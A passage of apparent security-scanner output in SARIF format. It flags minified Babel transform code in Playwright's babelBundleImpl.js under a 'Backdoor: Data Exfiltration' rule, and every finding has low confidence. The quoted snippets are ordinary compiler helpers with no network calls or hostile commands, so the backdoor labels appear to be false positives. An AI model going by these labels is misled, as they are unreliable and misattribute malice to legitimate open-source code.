                      "text": "(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(yl(),n,r),t)},destructureSet(e){let{computed:t}=e.node,r=this.prop(e);return Aa(yl(),r,t)},call(e,t){return(0,Yf.default)(this.get(e),yl(),t,!1)},optionalCall(e,t){return(0,Yf.default)(this.get(e),yl(),t,!0)}}),yE=class{constructor(t){var r;let n=t.methodPath;this.methodPath=n,this.isDerivedConstructor=n.isClassMethod({kind:\"constructor\"})&&!!t.superRef,this.isStatic=n.isObjectMethod()||n.node.static||(n.isStaticBlock==null?void 0:n.isStaticBlock()),this.isPrivateMethod=n.isPrivate()&&n.is",
                      "markdown": "`(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(yl(),n,r),t)},destructureSet(e){let{computed:t}=e.node,r=this.prop(e);return Aa(yl(),r,t)},call(e,t){return(0,Yf.default)(this.get(e),yl(),t,!1)},optionalCall(e,t){return(0,Yf.default)(this.get(e),yl(),t,!0)}}),yE=class{constructor(t){var r;let n=t.methodPath;this.methodPath=n,this.isDerivedConstructor=n.isClassMethod({kind:\"constructor\"})&&!!t.superRef,this.isStatic=n.isObjectMethod()||n.node.static||(n.isStaticBlock==null?void 0:n.isStaticBlock()),this.isPrivateMethod=n.isPrivate()&&n.is`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1773,
                  "startColumn": 541,
                  "endLine": 1773,
                  "endColumn": 546,
                  "snippet": {
                    "text": "\"Function\"),ml(\"prototype\"))}else{var o;i=Aa((o=r())!=null?o:ml(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(yl(),n,r),t)},destructureSet(e){let{computed:t}=e.node,r=this.prop(e);return Aa(yl(),r,t)},call(e,t){return(0,Yf.default)(this.get(e),yl(),t,!1)},optionalCall(e,t){return(0,Yf.default)(this.get(e),yl(),t,!0)}}),yE=class{constructor(t){var r;let n=t.methodPath;this.methodPath=n,this.isDerivedConstructor=n.isClassMethod({kind:\"constructor\"})&&!!t.superRef,this.isStatic=n.isObjectMethod()||n.node.static||(n.isStaticBlock==null?voi",
                    "rendered": {
                      "text": "\"Function\"),ml(\"prototype\"))}else{var o;i=Aa((o=r())!=null?o:ml(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(yl(),n,r),t)},destructureSet(e){let{computed:t}=e.node,r=this.prop(e);return Aa(yl(),r,t)},call(e,t){return(0,Yf.default)(this.get(e),yl(),t,!1)},optionalCall(e,t){return(0,Yf.default)(this.get(e),yl(),t,!0)}}),yE=class{constructor(t){var r;let n=t.methodPath;this.methodPath=n,this.isDerivedConstructor=n.isClassMethod({kind:\"constructor\"})&&!!t.superRef,this.isStatic=n.isObjectMethod()||n.node.static||(n.isStaticBlock==null?voi",
                      "markdown": "`\"Function\"),ml(\"prototype\"))}else{var o;i=Aa((o=r())!=null?o:ml(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(yl(),n,r),t)},destructureSet(e){let{computed:t}=e.node,r=this.prop(e);return Aa(yl(),r,t)},call(e,t){return(0,Yf.default)(this.get(e),yl(),t,!1)},optionalCall(e,t){return(0,Yf.default)(this.get(e),yl(),t,!0)}}),yE=class{constructor(t){var r;let n=t.methodPath;this.methodPath=n,this.isDerivedConstructor=n.isClassMethod({kind:\"constructor\"})&&!!t.superRef,this.isStatic=n.isObjectMethod()||n.node.static||(n.isStaticBlock==null?voi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1773,
                  "startColumn": 110,
                  "endLine": 1773,
                  "endColumn": 115,
                  "snippet": {
                    "text": "hrow new ReferenceError(\"'delete super[expr]' is invalid\"); }()\n        `]):gl.template.expression.ast`\n        function () { throw new ReferenceError(\"'delete super.prop' is invalid\"); }()\n      `}},rbe=Object.assign({},BO,{prop(e){let{property:t}=e.node;return this.memoiser.has(t)?on(this.memoiser.get(t)):on(t)},get(e){let{isStatic:t,getSuperRef:r}=this,{computed:n}=e.node,s=this.prop(e),i;if(t){var a;i=(a=r())!=null?a:Aa(ml(\"Function\"),ml(\"prototype\"))}else{var o;i=Aa((o=r())!=null?o:ml(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(",
                    "rendered": {
                      "text": "hrow new ReferenceError(\"'delete super[expr]' is invalid\"); }()\n        `]):gl.template.expression.ast`\n        function () { throw new ReferenceError(\"'delete super.prop' is invalid\"); }()\n      `}},rbe=Object.assign({},BO,{prop(e){let{property:t}=e.node;return this.memoiser.has(t)?on(this.memoiser.get(t)):on(t)},get(e){let{isStatic:t,getSuperRef:r}=this,{computed:n}=e.node,s=this.prop(e),i;if(t){var a;i=(a=r())!=null?a:Aa(ml(\"Function\"),ml(\"prototype\"))}else{var o;i=Aa((o=r())!=null?o:ml(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(",
                      "markdown": "`hrow new ReferenceError(\"'delete super[expr]' is invalid\"); }()\n        `]):gl.template.expression.ast`\n        function () { throw new ReferenceError(\"'delete super.prop' is invalid\"); }()\n      `}},rbe=Object.assign({},BO,{prop(e){let{property:t}=e.node;return this.memoiser.has(t)?on(this.memoiser.get(t)):on(t)},get(e){let{isStatic:t,getSuperRef:r}=this,{computed:n}=e.node,s=this.prop(e),i;if(t){var a;i=(a=r())!=null?a:Aa(ml(\"Function\"),ml(\"prototype\"))}else{var o;i=Aa((o=r())!=null?o:ml(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 13089,
                  "endLine": 1769,
                  "endColumn": 13094,
                  "snippet": {
                    "text": "=e.scope.getOwnBinding(t);r&&r.identifier.name===t&&e.scope.rename(t)}}]),BO={memoise(e,t){let{scope:r,node:n}=e,{computed:s,property:i}=n;if(!s)return;let a=r.maybeGenerateMemoised(i);a&&this.memoiser.set(i,a,t)},prop(e){let{computed:t,property:r}=e.node;return this.memoiser.has(r)?on(this.memoiser.get(r)):t?on(r):ebe(r.name)},get(e){return this._get(e,this._getThisRefs())},_get(e,t){let r=_O(this.getObjectRef(),this.isStatic,this.file,this.isPrivateMethod);return Hf(this.file.addHelper(\"get\"),[t.needAccessFirst?mE([t.this,r]):r,this.prop(e),t.this])},_getThisRefs(){return{needAccessFirst:this.isD",
                    "rendered": {
                      "text": "=e.scope.getOwnBinding(t);r&&r.identifier.name===t&&e.scope.rename(t)}}]),BO={memoise(e,t){let{scope:r,node:n}=e,{computed:s,property:i}=n;if(!s)return;let a=r.maybeGenerateMemoised(i);a&&this.memoiser.set(i,a,t)},prop(e){let{computed:t,property:r}=e.node;return this.memoiser.has(r)?on(this.memoiser.get(r)):t?on(r):ebe(r.name)},get(e){return this._get(e,this._getThisRefs())},_get(e,t){let r=_O(this.getObjectRef(),this.isStatic,this.file,this.isPrivateMethod);return Hf(this.file.addHelper(\"get\"),[t.needAccessFirst?mE([t.this,r]):r,this.prop(e),t.this])},_getThisRefs(){return{needAccessFirst:this.isD",
                      "markdown": "`=e.scope.getOwnBinding(t);r&&r.identifier.name===t&&e.scope.rename(t)}}]),BO={memoise(e,t){let{scope:r,node:n}=e,{computed:s,property:i}=n;if(!s)return;let a=r.maybeGenerateMemoised(i);a&&this.memoiser.set(i,a,t)},prop(e){let{computed:t,property:r}=e.node;return this.memoiser.has(r)?on(this.memoiser.get(r)):t?on(r):ebe(r.name)},get(e){return this._get(e,this._getThisRefs())},_get(e,t){let r=_O(this.getObjectRef(),this.isStatic,this.file,this.isPrivateMethod);return Hf(this.file.addHelper(\"get\"),[t.needAccessFirst?mE([t.this,r]):r,this.prop(e),t.this])},_getThisRefs(){return{needAccessFirst:this.isD`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 11450,
                  "endLine": 1769,
                  "endColumn": 11455,
                  "snippet": {
                    "text": "h(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))))}}function Gge(e,t,r){e.traverse(t,Object.assign({},Kge,r,{memoiser:new cE}))}fE.default=Gge});var hE=E(dE=>{\"use strict\";Object.defineProperty(dE,\"__esModule\",{value:!0});dE.default=Jge;var Hge=De(),{callExpression:wO,identifier:Gf,isIdentifier:Yge,isSpreadElement:Xge,memberExpression:DO,op",
                    "rendered": {
                      "text": "h(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))))}}function Gge(e,t,r){e.traverse(t,Object.assign({},Kge,r,{memoiser:new cE}))}fE.default=Gge});var hE=E(dE=>{\"use strict\";Object.defineProperty(dE,\"__esModule\",{value:!0});dE.default=Jge;var Hge=De(),{callExpression:wO,identifier:Gf,isIdentifier:Yge,isSpreadElement:Xge,memberExpression:DO,op",
                      "markdown": "`h(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))))}}function Gge(e,t,r){e.traverse(t,Object.assign({},Kge,r,{memoiser:new cE}))}fE.default=Gge});var hE=E(dE=>{\"use strict\";Object.defineProperty(dE,\"__esModule\",{value:!0});dE.default=Jge;var Hge=De(),{callExpression:wO,identifier:Gf,isIdentifier:Yge,isSpreadElement:Xge,memberExpression:DO,op`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 11384,
                  "endLine": 1769,
                  "endColumn": 11389,
                  "snippet": {
                    "text": "dTemplateExpression()?e.replaceWith(this.boundGet(e)):e.replaceWith(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))))}}function Gge(e,t,r){e.traverse(t,Object.assign({},Kge,r,{memoiser:new cE}))}fE.default=Gge});var hE=E(dE=>{\"use strict\";Object.defineProperty(dE,\"__esModule\",{value:!0});dE.default=Jge;var Hge=De(),{callExpression:wO,identif",
                    "rendered": {
                      "text": "dTemplateExpression()?e.replaceWith(this.boundGet(e)):e.replaceWith(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))))}}function Gge(e,t,r){e.traverse(t,Object.assign({},Kge,r,{memoiser:new cE}))}fE.default=Gge});var hE=E(dE=>{\"use strict\";Object.defineProperty(dE,\"__esModule\",{value:!0});dE.default=Jge;var Hge=De(),{callExpression:wO,identif",
                      "markdown": "`dTemplateExpression()?e.replaceWith(this.boundGet(e)):e.replaceWith(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))))}}function Gge(e,t,r){e.traverse(t,Object.assign({},Kge,r,{memoiser:new cE}))}fE.default=Gge});var hE=E(dE=>{\"use strict\";Object.defineProperty(dE,\"__esModule\",{value:!0});dE.default=Jge;var Hge=De(),{callExpression:wO,identif`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 11156,
                  "endLine": 1769,
                  "endColumn": 11161,
                  "snippet": {
                    "text": "sObjectProperty({value:n})&&s.parentPath.parentPath.isObjectPattern()||s.isArrayPattern()||s.isAssignmentPattern({left:r})&&s.parentPath.isArrayPattern()||s.isRestElement()){e.replaceWith(this.destructureSet(e));return}s.isTaggedTemplateExpression()?e.replaceWith(this.boundGet(e)):e.replaceWith(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))",
                    "rendered": {
                      "text": "sObjectProperty({value:n})&&s.parentPath.parentPath.isObjectPattern()||s.isArrayPattern()||s.isAssignmentPattern({left:r})&&s.parentPath.isArrayPattern()||s.isRestElement()){e.replaceWith(this.destructureSet(e));return}s.isTaggedTemplateExpression()?e.replaceWith(this.boundGet(e)):e.replaceWith(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))",
                      "markdown": "`sObjectProperty({value:n})&&s.parentPath.parentPath.isObjectPattern()||s.isArrayPattern()||s.isAssignmentPattern({left:r})&&s.parentPath.isArrayPattern()||s.isRestElement()){e.replaceWith(this.destructureSet(e));return}s.isTaggedTemplateExpression()?e.replaceWith(this.boundGet(e)):e.replaceWith(this.get(e))}};function PO(e,t,r){if(e.simpleSet){t.replaceWith(e.simpleSet(t));return}let{operator:n,right:s}=r.node;if(n===\"=\")r.replaceWith(e.set(t,s));else{let i=n.slice(0,-1);jge.includes(i)?(e.memoise(t,1),r.replaceWith(Wf(i,e.get(t),e.set(t,s)))):(e.memoise(t,2),r.replaceWith(e.set(t,vi(i,e.get(t),s))`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 10051,
                  "endLine": 1769,
                  "endColumn": 10056,
                  "snippet": {
                    "text": "node;O.replaceWith(Vge($ge(R.callee,AO(\"call\"),!1,!0),[Kr(D),...R.arguments],!1))}return}if(Uge(n,{argument:r})){if(this.simpleSet){e.replaceWith(this.simpleSet(e));return}let{operator:a,prefix:o}=n;this.memoise(e,2);let l=i.generateUidIdentifierBasedOnNode(r);i.push({id:l});let u=[Pa(\"=\",Kr(l),this.get(e))];if(o){u.push(SO(a,Kr(l),o));let c=lE(u);s.replaceWith(this.set(e,c));return}else{let c=i.generateUidIdentifierBasedOnNode(r);i.push({id:c}),u.push(Pa(\"=\",Kr(c),SO(a,Kr(l),o)),Kr(l));let f=lE(u);s.replaceWith(lE([this.set(e,f),Kr(c)]));return}}if(s.isAssignmentExpression({left:r})){PO(this,e,s);",
                    "rendered": {
                      "text": "node;O.replaceWith(Vge($ge(R.callee,AO(\"call\"),!1,!0),[Kr(D),...R.arguments],!1))}return}if(Uge(n,{argument:r})){if(this.simpleSet){e.replaceWith(this.simpleSet(e));return}let{operator:a,prefix:o}=n;this.memoise(e,2);let l=i.generateUidIdentifierBasedOnNode(r);i.push({id:l});let u=[Pa(\"=\",Kr(l),this.get(e))];if(o){u.push(SO(a,Kr(l),o));let c=lE(u);s.replaceWith(this.set(e,c));return}else{let c=i.generateUidIdentifierBasedOnNode(r);i.push({id:c}),u.push(Pa(\"=\",Kr(c),SO(a,Kr(l),o)),Kr(l));let f=lE(u);s.replaceWith(lE([this.set(e,f),Kr(c)]));return}}if(s.isAssignmentExpression({left:r})){PO(this,e,s);",
                      "markdown": "`node;O.replaceWith(Vge($ge(R.callee,AO(\"call\"),!1,!0),[Kr(D),...R.arguments],!1))}return}if(Uge(n,{argument:r})){if(this.simpleSet){e.replaceWith(this.simpleSet(e));return}let{operator:a,prefix:o}=n;this.memoise(e,2);let l=i.generateUidIdentifierBasedOnNode(r);i.push({id:l});let u=[Pa(\"=\",Kr(l),this.get(e))];if(o){u.push(SO(a,Kr(l),o));let c=lE(u);s.replaceWith(this.set(e,c));return}else{let c=i.generateUidIdentifierBasedOnNode(r);i.push({id:c}),u.push(Pa(\"=\",Kr(c),SO(a,Kr(l),o)),Kr(l));let f=lE(u);s.replaceWith(lE([this.set(e,f),Kr(c)]));return}}if(s.isAssignmentExpression({left:r})){PO(this,e,s);`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 9107,
                  "endLine": 1769,
                  "endColumn": 9112,
                  "snippet": {
                    "text": "replaceWith(xO(f,b)),y()?n.optional?s.replaceWith(this.optionalCall(e,n.arguments)):s.replaceWith(this.call(e,n.arguments)):v?e.replaceWith(this.boundGet(e)):this.delete&&s.isUnaryExpression({operator:\"delete\"})?s.replaceWith(this.delete(e)):s.isAssignmentExpression()?PO(this,e,s):e.replaceWith(this.get(e));let I=e.node;for(let R=e;R!==a;){let K=R.parentPath;if(K===a&&y()&&n.optional){I=K.node;break}I=xO(K,I),R=K}let D,O=a.parentPath;if(Rge(I)&&O.isOptionalCallExpression({callee:a.node,optional:!0})){let{object:R}=I;D=e.scope.maybeGenerateMemoised(R),D&&(I.object=Pa(\"=\",D,R))}let _=a;(c||u)&&(_=O,I",
                    "rendered": {
                      "text": "replaceWith(xO(f,b)),y()?n.optional?s.replaceWith(this.optionalCall(e,n.arguments)):s.replaceWith(this.call(e,n.arguments)):v?e.replaceWith(this.boundGet(e)):this.delete&&s.isUnaryExpression({operator:\"delete\"})?s.replaceWith(this.delete(e)):s.isAssignmentExpression()?PO(this,e,s):e.replaceWith(this.get(e));let I=e.node;for(let R=e;R!==a;){let K=R.parentPath;if(K===a&&y()&&n.optional){I=K.node;break}I=xO(K,I),R=K}let D,O=a.parentPath;if(Rge(I)&&O.isOptionalCallExpression({callee:a.node,optional:!0})){let{object:R}=I;D=e.scope.maybeGenerateMemoised(R),D&&(I.object=Pa(\"=\",D,R))}let _=a;(c||u)&&(_=O,I",
                      "markdown": "`replaceWith(xO(f,b)),y()?n.optional?s.replaceWith(this.optionalCall(e,n.arguments)):s.replaceWith(this.call(e,n.arguments)):v?e.replaceWith(this.boundGet(e)):this.delete&&s.isUnaryExpression({operator:\"delete\"})?s.replaceWith(this.delete(e)):s.isAssignmentExpression()?PO(this,e,s):e.replaceWith(this.get(e));let I=e.node;for(let R=e;R!==a;){let K=R.parentPath;if(K===a&&y()&&n.optional){I=K.node;break}I=xO(K,I),R=K}let D,O=a.parentPath;if(Rge(I)&&O.isOptionalCallExpression({callee:a.node,optional:!0})){let{object:R}=I;D=e.scope.maybeGenerateMemoised(R),D&&(I.object=Pa(\"=\",D,R))}let _=a;(c||u)&&(_=O,I`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 8531,
                  "endLine": 1769,
                  "endColumn": 8536,
                  "snippet": {
                    "text": "sOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new Error(`Internal error: unexpected ${f.node.type}`)}let p=f.isOptionalMemberExpression()?f.node.object:f.node.callee,m=i.maybeGenerateMemoised(p),b=m!=null?m:p,d=s.isOptionalCallExpression({callee:r}),y=R=>d,v=s.isCallExpression({callee:r});f.replaceWith(xO(f,b)),y()?n.op",
                    "rendered": {
                      "text": "sOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new Error(`Internal error: unexpected ${f.node.type}`)}let p=f.isOptionalMemberExpression()?f.node.object:f.node.callee,m=i.maybeGenerateMemoised(p),b=m!=null?m:p,d=s.isOptionalCallExpression({callee:r}),y=R=>d,v=s.isCallExpression({callee:r});f.replaceWith(xO(f,b)),y()?n.op",
                      "markdown": "`sOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new Error(`Internal error: unexpected ${f.node.type}`)}let p=f.isOptionalMemberExpression()?f.node.object:f.node.callee,m=i.maybeGenerateMemoised(p),b=m!=null?m:p,d=s.isOptionalCallExpression({callee:r}),y=R=>d,v=s.isCallExpression({callee:r});f.replaceWith(xO(f,b)),y()?n.op`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 8441,
                  "endLine": 1769,
                  "endColumn": 8446,
                  "snippet": {
                    "text": "isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new Error(`Internal error: unexpected ${f.node.type}`)}let p=f.isOptionalMemberExpression()?f.node.object:f.node.callee,m=i.maybeGenerateMemoised(p),b=m!=null?m:p,d=s.isOptionalCallExpr",
                    "rendered": {
                      "text": "isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new Error(`Internal error: unexpected ${f.node.type}`)}let p=f.isOptionalMemberExpression()?f.node.object:f.node.callee,m=i.maybeGenerateMemoised(p),b=m!=null?m:p,d=s.isOptionalCallExpr",
                      "markdown": "`isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new Error(`Internal error: unexpected ${f.node.type}`)}let p=f.isOptionalMemberExpression()?f.node.object:f.node.callee,m=i.maybeGenerateMemoised(p),b=m!=null?m:p,d=s.isOptionalCallExpr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 8261,
                  "endLine": 1769,
                  "endColumn": 8266,
                  "snippet": {
                    "text": "){a.replaceWith(Kf(vO([],a.node),[]));return}let o=uE(a),l=a.parentPath;if(l.isUpdateExpression({argument:r}))throw e.buildCodeFrameError(\"can't handle update expression\");let u=l.isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new E",
                    "rendered": {
